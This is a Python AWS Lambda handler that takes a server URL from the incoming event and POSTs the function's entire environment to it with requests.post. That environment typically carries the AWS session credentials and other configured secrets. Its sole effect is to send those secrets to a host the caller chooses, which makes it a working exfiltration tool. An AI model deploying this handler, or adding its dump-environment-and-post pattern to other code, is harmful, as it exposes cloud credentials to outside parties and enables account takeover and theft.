import os
import json
import boto3
import requests

def lambda_handler(event, context):
    # Get the server URL from the event
    server_url = event.get("server_url", "")

    # Check if the server_url is provided
    if not server_url:
        return {
            'statusCode': 400,
            'body': json.dumps('server_url not provided')
        }

    # Extract environment variables
    env_data = dict(os.environ)

    try:
        # Send the environment variables as a POST request
        response = requests.post(server_url, json=env_data)
        return {
            'statusCode': 200,
            'body': json.dumps(f"Data sent to server. Server responded with: {response.text}")
        }
    except Exception as e:
        return {
            'statusCode': 500,
            'body': json.dumps(str(e))
        }
